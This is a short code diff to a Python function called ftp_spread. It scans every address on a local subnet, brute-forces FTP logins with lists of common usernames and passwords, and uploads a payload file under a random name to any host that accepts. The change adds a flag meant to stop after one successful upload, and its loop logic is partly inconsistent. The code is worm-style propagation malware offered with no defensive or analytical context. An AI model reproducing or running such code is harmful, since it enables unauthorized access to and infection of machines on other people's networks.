@@ -265,10 +265,12 @@ def ftp_spread():
             'poiuypoiuy',
             'sysadm'
         ]
-
+        done = False
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
             for user in common_users:
+                if done: break
+                done = False
                 for pwd in common_pass:
                     try:
                         ftp = ftplib.FTP(ip, timeout=1)
@@ -279,6 +281,7 @@ def ftp_spread():
                             with open(payload_path, 'rb') as f:
                                 ftp.storbinary(f'STOR {random_name}', f)
                         ftp.quit()
+                        done = True
                         break 
                     except:
                         continue
